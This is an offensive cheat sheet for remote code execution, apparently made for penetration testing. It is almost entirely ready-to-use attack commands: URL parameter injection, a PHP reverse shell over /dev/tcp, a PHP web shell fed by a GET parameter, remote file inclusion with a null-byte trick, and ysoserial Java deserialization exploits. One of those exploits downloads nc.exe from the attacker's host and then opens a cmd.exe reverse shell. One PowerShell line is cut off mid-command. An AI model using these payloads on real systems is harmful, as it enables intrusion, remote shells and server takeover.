# Code Execution

## RCE



### Injection in parameters

```
curl http://<url>?<arg>=<cmd>    #GET
curl -G "http://<url>" --data-urlencode "<cmd>"    #GET encoded
```

When using url encoding with Windows paths the separators have to be escaped as \\\ for example `C:\\folder1\\folder2`

## Code Injection

### PHP

### Reverse shell

```php
<?php echo system("0<&196;exec 196<>/dev/tcp/{IP}/{PORT}; sh <&196 >&196 2>&196"); ?>    #rev shell
http://<url>/index.php?page=http://<local host>.com/<file>.txt
```

### Remote execution

```php
<?php echo shell_exec($_GET['cmd']);?>
http://<url>/index.php?page=http://<local host>.com/<file>.txt&cmd="<command>"
```

### Notes

* Append `%00` or `?` at the end of the URL to prevent the server from appending `.php` at the end of the string
* Save the malicious file as `.txt` or else it will be executed by your local server instead of the remote target

### Java

Exploit Java deserialization vulnerabilities using ysoserial (requires java installed on local machine). Can be downloaded from [here](https://github.com/frohoff/ysoserial)

#### Deploy payload

```
java -cp ysoserial.jar ysoserial.exploit.RMIRegistryExploit <IP> <port> CommonsCollections1 <command or payload>
```

#### NC upload and reverse shell

```
java -cp ysoserial.jar ysoserial.exploit.RMIRegistryExploit <IP> <port> CommonsCollections1 "powershell -c \"(new-object System.Net.WebClient).DownloadFile('http://<local ip>/nc.exe','C:\<path>\nc.exe')\""
java -cp ysoserial.jar ysoserial.exploit.RMIRegistryExploit <IP> <port> CommonsCollections1 "C:\<target folder>\nc.exe -nv <local ip> <local port> -e cmd.exe"
```

#### Powershell

```
java -cp ysoserial.jar ysoserial.exploit.RMIRegistryExploit <IP> <port> CommonsCollections1 "powershell -c \"$c
```

### Python

```
os.system("<cmd>")
import os;print(str(os.popen('<cmd>').read()));
```

